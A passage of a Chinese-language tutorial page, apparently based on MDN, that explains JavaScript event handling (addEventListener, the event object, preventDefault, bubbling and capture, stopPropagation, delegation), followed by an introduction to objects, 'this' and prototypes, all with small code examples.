class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">bgChange</span>)</span>;<br></code></pre></td></tr></table></figure><p>在这个简单的、小型的项目中可能不是很有用，但是在大型的、复杂的项目中就非常有用了，可以非常高效地清除不用的事件处理器，另外在其他的一些场景中也非常有效——比如您需要在不同环境下运行不同的事件处理器，您只需要恰当地删除或者添加事件处理器即可。</p><p>您也可以给同一个监听器注册多个处理器，下面这种方式不能实现这一点：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">myElement.onclick</span> = functionA<span class="hljs-comment">;</span><br><span class="hljs-attr">myElement.onclick</span> = functionB<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>第二行会覆盖第一行，但是下面这种方式就会正常工作了：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">myElement.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">functionA</span>)</span>;<br>myElement.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">functionB</span>)</span>;<br></code></pre></td></tr></table></figure><p>当元素被点击时两个函数都会工作：</p><p>此外，该事件机制还提供了许多其他强大的特性和选项。这对于本文来说有点超出范围，但是如果您想要阅读它们，请查看<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener"><code>addEventListener()</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/removeEventListener"><code>removeEventListener()</code></a>参考页面。</p><h4 id="我该使用哪种机制？"><a href="#我该使用哪种机制？" class="headerlink" title="我该使用哪种机制？"></a>我该使用哪种机制？</h4><p>在三种机制中，您绝对不应该使用 HTML 事件处理程序属性 - 这些属性已经过时了，而且也是不好的做法，如上所述。</p><p>另外两种是相对可互换的，至少对于简单的用途：</p><ul><li>事件处理程序属性功能和选项会更少，但是具有更好的跨浏览器兼容性 (在 Internet Explorer 8 的支持下)，您应该从这些开始学起。</li><li>DOM Level 2 Events (<code>addEventListener()</code>, etc.) 更强大，但也可以变得更加复杂，并且支持不足（只支持到 Internet Explorer 9）。但是您也应该尝试这个方法，并尽可能地使用它们。</li></ul><p>第三种机制（DOM Level 2 Events (<code>addEventListener()</code>, etc.)）的主要优点是，如果需要的话，可以使用<code>removeEventListener()</code>删除事件处理程序代码，而且如果有需要，您可以向同一类型的元素添加多个监听器。例如，您可以在一个元素上多次调用<code>addEventListener(&#39;click&#39;, function() &#123; ... &#125;)</code>，并可在第二个参数中指定不同的函数。对于事件处理程序属性来说，这是不可能的，因为后面任何设置的属性都会尝试覆盖较早的属性，例如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">element.onclick <span class="hljs-operator">=</span> function1<span class="hljs-comment">;</span><br>element.onclick <span class="hljs-operator">=</span> function2<span class="hljs-comment">;</span><br>etc.<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 如果您在工作中被要求支持比 Internet Explorer 8 更老的浏览器，那么您可能会遇到困难，因为这些古老的浏览器会使用与现代浏览器不同的事件处理模型。但是不要害怕，大多数 JavaScript 库 (例如 jQuery ) 都内置了能够跨浏览器差异的函数。在你学习 JavaScript 旅程里的这个阶段，不要太担心这个问题。</p><h4 id="其他事件概念"><a href="#其他事件概念" class="headerlink" title="其他事件概念"></a>其他事件概念</h4><p>本节我们将简要介绍一些与事件相关的高级概念。在这一点并不需要完全理解透彻，但它可能有助于你解释一些经常会遇到的代码模式。</p><h4 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h4><p>有时候在事件处理函数内部，您可能会看到一个固定指定名称的参数，例如<code>event</code>，<code>evt</code>或简单的<code>e</code>。这被称为<strong>事件对象</strong>，它被自动传递给事件处理函数，以提供额外的功能和信息。例如，让我们稍稍重写一遍我们的随机颜色示例：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bgChange</span>(<span class="hljs-params">e</span>) &#123;<br>  const rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  e.target.style.backgroundColor = rndCol;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(e);<br>&#125;<br><br>btn.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, bgChange);<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 您可以在 Github 上查看这个示例的 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/random-color-eventobject.html">完整代码</a> ，或者在这里查看 <a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/random-color-eventobject.html">实时演示</a>。</p><p>在这里，您可以看到我们在函数中包括一个事件对象<code>e</code>，并在函数中设置背景颜色样式在 <code>e.target</code> 上——它指的是按钮本身。事件对象 <code>e</code> 的 <code>target</code> 属性始终是事件刚刚发生的元素的引用。所以在这个例子中，我们在按钮上设置一个随机的背景颜色，而不是页面。</p><p><strong>备注：</strong> 您可以使用任何您喜欢的名称作为事件对象 - 您只需要选择一个名称，然后可以在事件处理函数中引用它。开发人员最常使用 e &#x2F; evt &#x2F; event，因为它们很简单易记。坚持标准总是很好。</p><p>当您要在多个元素上设置相同的事件处理程序时，<code>e.target</code>非常有用，并且在发生事件时对所有元素执行某些操作。例如，你可能有一组 16 块方格，当它们被点击时就会消失。用 e.target 总是能准确选择当前操作的东西（方格）并执行操作让它消失，而不是必须以更困难的方式选择它。在下面的示例中 (请参见<a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/useful-eventtarget.html">useful-eventtarget.html</a>完整代码;也可以在线运行<a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/useful-eventtarget.html">running live</a>）我们使用 JavaScript 创建了 16 个<code>&lt;div&gt;</code>元素。接着我们使用 <code>document.querySelectorAll()</code>选择全部的元素，然后遍历每一个，为每一个元素都添加一个<code>onclick</code>单击事件，每当它们点击时就会为背景添加一个随机颜色。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> divs = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; divs.<span class="hljs-property">length</span>; i++) &#123;<br>  divs[i].<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123;<br>    e.<span class="hljs-property">target</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-title function_">bgChange</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下 (试着点击它 - 玩的开心):</p><iframe class="sample-code-frame" title="事件对象 sample" id="frame_事件对象" width="100%" height="400" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Building_blocks/Events/_sample_.%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>你遇到的大多数事件处理器的事件对象都有可用的标准属性和函数（方法）（请参阅完整列表 <code>Event</code> 对象引用）。然而，一些更高级的处理程序会添加一些专业属性，这些属性包含它们需要运行的额外数据。例如，媒体记录器 API 有一个<code>dataavailable</code>事件，它会在录制一些音频或视频时触发，并且可以用来做一些事情 (例如保存它，或者回放)。对应的<code>ondataavailable</code>处理程序的事件对象有一个可用的数据属性。</p><h4 id="阻止默认行为"><a href="#阻止默认行为" class="headerlink" title="阻止默认行为"></a>阻止默认行为</h4><p>有时，你会遇到一些情况，你希望事件不执行它的默认行为。最常见的例子是 Web 表单，例如自定义注册表单。当你填写详细信息并按提交按钮时，自然行为是将数据提交到服务器上的指定页面进行处理，并将浏览器重定向到某种“成功消息”页面（或 相同的页面，如果另一个没有指定。）</p><p>当用户没有正确提交数据时，麻烦就来了 - 作为开发人员，你希望停止提交信息给服务器，并给他们一个错误提示，告诉他们什么做错了，以及需要做些什么来修正错误。一些浏览器支持自动的表单数据验证功能，但由于许多浏览器不支持，因此建议你不要依赖这些功能，并实现自己的验证检查。我们来看一个简单的例子。</p><p>首先，一个简单的 HTML 表单，需要你填入名（first name）和姓（last name）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span>First name: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;fname&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span>Last name: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;lname&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里我们用一个<code>onsubmit</code>事件处理程序（在提交的时候，在一个表单上发起<code>submit</code>事件）来实现一个非常简单的检查，用于测试文本字段是否为空。如果是，我们在事件对象上调用<code>preventDefault()</code>函数，这样就停止了表单提交，然后在我们表单下面的段落中显示一条错误消息，告诉用户什么是错误的：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">const</span> form = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br><span class="hljs-keyword">const</span> fname = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;fname&#x27;</span>);<br><span class="hljs-keyword">const</span> lname = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;lname&#x27;</span>);<br><span class="hljs-keyword">const</span> submit = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;submit&#x27;</span>);<br><span class="hljs-keyword">const</span> para = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelector</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br><br>form.onsubmit = function(e) &#123;<br>  <span class="hljs-keyword">if</span> (fname.value === <span class="hljs-string">&#x27;&#x27;</span> || lname.value === <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>    e.preventDefault();<br>    para.textContent = <span class="hljs-string">&#x27;You need to fill in both names!&#x27;</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>显然，这是一种非常弱的表单验证——例如，用户输入空格或数字提交表单，表单验证并不会阻止用户提交——这不是我们例子想要达到的目的。输出如下：</p><iframe class="sample-code-frame" title="阻止默认行为 sample" id="frame_阻止默认行为" width="100%" height="140" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Building_blocks/Events/_sample_.%E9%98%BB%E6%AD%A2%E9%BB%98%E8%AE%A4%E8%A1%8C%E4%B8%BA.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 查看完整的源代码 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/preventdefault-validation.html">preventdefault-validation.html</a> (也可以 <a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/preventdefault-validation.html">running live</a> )</p><h4 id="事件冒泡及捕获"><a href="#事件冒泡及捕获" class="headerlink" title="事件冒泡及捕获"></a>事件冒泡及捕获</h4><p>最后即将介绍的这个主题你常常不会深究，但如果你不理解这个主题，就会十分痛苦。事件冒泡和捕捉是两种机制，主要描述当在一个元素上有两个相同类型的事件处理器被激活会发生什么。为了容易理解，我们来看一个例子——在新标签页打开这个<a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/show-video-box.html">show-video-box.html</a> 例子（在这里可以查看源码 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/show-video-box.html">source code</a>）。也可以在下面查看：</p><iframe class="sample-code-frame" title="事件冒泡及捕获 sample" id="frame_事件冒泡及捕获" width="100%" height="500" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/JavaScript/Building_blocks/Events/_sample_.%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E5%8F%8A%E6%8D%95%E8%8E%B7.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>这是一个非常简单的例子，它显示和隐藏一个包含 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video"><code>video</code></a> 元素的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>div</code></a> 元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>Display video<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://raw.githubusercontent.com/mdn/learning-area/master/javascript/building-blocks/events/rabbit320.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://raw.githubusercontent.com/mdn/learning-area/master/javascript/building-blocks/events/rabbit320.webm&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/webm&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Your browser doesn&#x27;t support HTML video. Here is a <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;rabbit320.mp4&quot;</span>&gt;</span>link to the video<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> instead.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当“button”元素按钮被单击时，将显示视频，它是通过将改变 <code>&lt;div&gt;</code> 的 class 属性值从 <code>hidden</code> 变为 <code>showing</code>(这个例子的 CSS 包含两个 <code>class</code>，它们分别控制这个 <code>&lt;div&gt;</code> 盒子在屏幕上显示还是隐藏。)：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">const btn = document.query<span class="hljs-constructor">Selector(&#x27;<span class="hljs-params">button</span>&#x27;)</span>;<br>const videoBox = document.query<span class="hljs-constructor">Selector(&#x27;<span class="hljs-params">div</span>&#x27;)</span>;<br><br><span class="hljs-keyword">function</span> display<span class="hljs-constructor">Video()</span> &#123;<br>  <span class="hljs-keyword">if</span> (videoBox.get<span class="hljs-constructor">Attribute(&#x27;<span class="hljs-params">class</span>&#x27;)</span><span class="hljs-operator"> === </span>&#x27;hidden&#x27;) &#123;<br>    videoBox.set<span class="hljs-constructor">Attribute(&#x27;<span class="hljs-params">class</span>&#x27;,&#x27;<span class="hljs-params">showing</span>&#x27;)</span>;<br>  &#125;<br>&#125;<br><br>btn.add<span class="hljs-constructor">EventListener(&#x27;<span class="hljs-params">click</span>&#x27;, <span class="hljs-params">displayVideo</span>)</span>;<br></code></pre></td></tr></table></figure><p>然后我们再添加几个<code>click</code>事件处理器，第一个添加在<code>&lt;div&gt;</code>元素上，第二个添加在<code>&lt;video&gt;</code>元素上。这个想法是当视频 (<code>&lt;video&gt;</code>）外 <code>&lt;div&gt;</code>元素内这块区域被单击时，这个视频盒子应该再次隐藏；当单击视频 (<code>&lt;video&gt;</code>）本身，这个视频将开始播放。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">videoBox.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> videoBox.setAttribute(<span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;hidden&#x27;</span>));<br><br>const video = document.querySelector(<span class="hljs-string">&#x27;video&#x27;</span>);<br><br>video.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> video.play());<br></code></pre></td></tr></table></figure><p>但是有一个问题 - 当您点击<code>video</code>开始播放的视频时，它会在同一时间导致<code>&lt;div&gt;</code>也被隐藏。这是因为<code>video</code>在<code>&lt;div&gt;</code>之内 - <code>video</code>是<code>&lt;div&gt;</code>的一个子元素 - 所以点击<code>video</code>实际上是同时也运行<code>&lt;div&gt;</code>上的事件处理程序。</p><h4 id="对事件冒泡和捕捉的解释"><a href="#对事件冒泡和捕捉的解释" class="headerlink" title="对事件冒泡和捕捉的解释"></a>对事件冒泡和捕捉的解释</h4><p>当一个事件发生在具有父元素的元素上 (例如，在我们的例子中是<code>&lt;video&gt;</code>元素) 时，现代浏览器运行两个不同的阶段 - 捕获阶段和冒泡阶段。在捕获阶段：</p><ul><li>浏览器检查元素的最外层祖先<code>&lt;html&gt;</code>，是否在捕获阶段中注册了一个<code>onclick</code>事件处理程序，如果是，则运行它。</li><li>然后，它移动到<code>&lt;html&gt;</code>中单击元素的下一个祖先元素，并执行相同的操作，然后是单击元素再下一个祖先元素，依此类推，直到到达实际点击的元素。</li></ul><p>在冒泡阶段，恰恰相反：</p><ul><li>浏览器检查实际点击的元素是否在冒泡阶段中注册了一个<code>onclick</code>事件处理程序，如果是，则运行它</li><li>然后它移动到下一个直接的祖先元素，并做同样的事情，然后是下一个，等等，直到它到达<code>&lt;html&gt;</code>元素。</li></ul><p>在现代浏览器中，默认情况下，所有事件处理程序都在冒泡阶段进行注册。因此，在我们当前的示例中，当您单击视频时，这个单击事件从 <code>&lt;video&gt;</code>元素向外冒泡直到<code>&lt;html&gt;</code>元素。沿着这个事件冒泡线路：</p><ul><li>它发现了<code>video.onclick...</code>事件处理器并且运行它，因此这个视频<code>&lt;video&gt;</code>第一次开始播放。</li><li>接着它发现了（往外冒泡找到的） <code>videoBox.onclick...</code>事件处理器并且运行它，因此这个视频<code>&lt;video&gt;</code>也隐藏起来了。</li></ul><h4 id="用-stopPropagation-修复问题"><a href="#用-stopPropagation-修复问题" class="headerlink" title="用 stopPropagation() 修复问题"></a>用 stopPropagation() 修复问题</h4><p>这是令人讨厌的行为，但有一种方法来解决它！标准事件对象具有可用的名为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Event/stopPropagation"><code>stopPropagation()</code></a>的函数，当在事件对象上调用该函数时，它只会让当前事件处理程序运行，但事件不会在<strong>冒泡</strong>链上进一步扩大，因此将不会有更多事件处理器被运行 (不会向上冒泡)。所以，我们可以通过改变前面代码块中的第二个处理函数来解决当前的问题：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">video.onclick <span class="hljs-operator">=</span> function(e) &#123;<br>  e.stopPropagation()<span class="hljs-comment">;</span><br>  video.play()<span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>你可以尝试把 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/show-video-box.html">show-video-box.html source code</a> 拷贝到本地，然后自己动手修复它，或者在 <a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/show-video-box-fixed.html">show-video-box-fixed.html</a> 页面查看修复结果（也可以在这里 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/show-video-box-fixed.html">source code</a> 查看源码）。</p><p><strong>备注：</strong> 为什么我们要弄清楚捕捉和冒泡呢？那是因为，在过去糟糕的日子里，浏览器的兼容性比现在要小得多，Netscape（网景）只使用事件捕获，而 Internet Explorer 只使用事件冒泡。当 W3C 决定尝试规范这些行为并达成共识时，他们最终得到了包括这两种情况（捕捉和冒泡）的系统，最终被应用在现在浏览器里。</p><p><strong>备注：</strong> 如上所述，默认情况下，所有事件处理程序都是在冒泡阶段注册的，这在大多数情况下更有意义。如果您真的想在捕获阶段注册一个事件，那么您可以通过使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener"><code>addEventListener()</code></a>注册您的处理程序，并将可选的第三个属性设置为 true。</p><h4 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h4><p>冒泡还允许我们利用事件委托——这个概念依赖于这样一个事实，如果你想要在大量子元素中单击任何一个都可以运行一段代码，您可以将事件监听器设置在其父节点上，并让子节点上发生的事件冒泡到父节点上，而不是每个子节点单独设置事件监听器。</p><p>一个很好的例子是一系列列表项，如果你想让每个列表项被点击时弹出一条信息，您可以将<code>click</code>单击事件监听器设置在父元素<code>&lt;ul&gt;</code>上，这样事件就会从列表项冒泡到其父元素<code>&lt;ul&gt;</code>上。</p><p>这个的概念在 David Walsh 的博客上有更多的解释，并有多个例子——看看<a href="https://davidwalsh.name/event-delegate">How JavaScript Event Delegation Works</a>.</p><h3 id="3-5-对象入门"><a href="#3-5-对象入门" class="headerlink" title="3.5 对象入门"></a>3.5 对象入门</h3><p>点表示法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">name</span>.<span class="hljs-keyword">first</span><br><span class="hljs-built_in">name</span>.<span class="hljs-keyword">last</span><br></code></pre></td></tr></table></figure><p>括号表示法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">person<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;age&#x27;</span>]</span><br>person<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;name&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;first&#x27;</span>]</span><br></code></pre></td></tr></table></figure><h4 id="“this”的含义"><a href="#“this”的含义" class="headerlink" title="“this”的含义"></a>“this”的含义</h4><p>你也许在我们的方法里注意到了一些奇怪的地方，看这个例子：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">greeting: <span class="hljs-keyword">function</span><span class="hljs-params">()</span> &#123;<br>  alert(<span class="hljs-string">&#x27;Hi! I\&#x27;m &#x27;</span> + <span class="hljs-keyword">this</span>.name.first + <span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>你也许想知道”this”是什么，关键字”this”指向了当前代码运行时的对象 ( 原文：the current object the code is being written inside )——这里即指 person 对象，为什么不直接写 person 呢？当你学到下一篇<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Classes_in_JavaScript">Object-oriented JavaScript for beginners</a>文章时，我们开始使用构造器 (constructor) 时，”this”是非常有用的——它保证了当代码的上下文 (context) 改变时变量的值的正确性（比如：不同的 person 对象拥有不同的 name 这个属性，很明显 greeting 这个方法需要使用的是它们自己的 name）。</p><h4 id="基于原型的语言？"><a href="#基于原型的语言？" class="headerlink" title="基于原型的语言？"></a>基于原型的语言？</h4><p>JavaScript 常被描述为一种<strong>基于原型的语言 (prototype-based language)<strong>——每个对象拥有一个</strong>原型对象</strong>，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，并从中继承方法和属性，一层一层、以此类推。这种关系常被称为**原型链 (prototype chain)**，它解释了为何一个对象会拥有定义在其他对象中的属性和方法。</p><p>准确地说，这些属性和方法定义在 Object 的构造器函数 (constructor functions) 之上的<code>prototype</code>属性上，而非对象实例本身。</p><p>在传统的 OOP 中，首先定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。在 JavaScript 中并不如此复制——而是在对象实例和它的构造器之间建立一个链接（它是__proto__属性，是从构造函数的<code>prototype</code>属性派生的），之后通过上溯原型链，在构造器中找到这些属性和方法。</p><p><strong>备注：</strong> 理解对象的原型（可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf"><code>Object.getPrototypeOf(obj)</code></a>或者已被弃用的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto"><code>__proto__</code></a>属性获得）与构造函数的 <code>prototype</code> 属性之间的区别是很重要的。前者是每个实例上都有的属性，后者是构造函数的属性。也就是说，<code>Object.getPrototypeOf(new Foobar())</code> 和 <code>Foobar.prototype</code> 指向着同一个对象。</p><h4 id="使用-Javascript-中的原型"><a href="#使用-Javascript-中的原型" class="headerlink" title="使用 Javascript 中的原型"></a>使用 Javascript 中的原型</h4><p>在 javascript 中，函数可以有属性。每个函数都有一个特殊的属性叫作<strong>原型（prototype）</strong>，正如下面所展示的。请注意，下面的代码是独立的一段 (在网页中没有其他代码的情况下，这段代码是安全的)。为了最好的学习体验，你最好打开一个控制台 (在 Chrome 和 Firefox 中，可以按 Ctrl+Shift+I 来打开) 切换到”控制台” 选项卡，复制粘贴下面的 JavaScript 代码，然后按回车来运行。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title 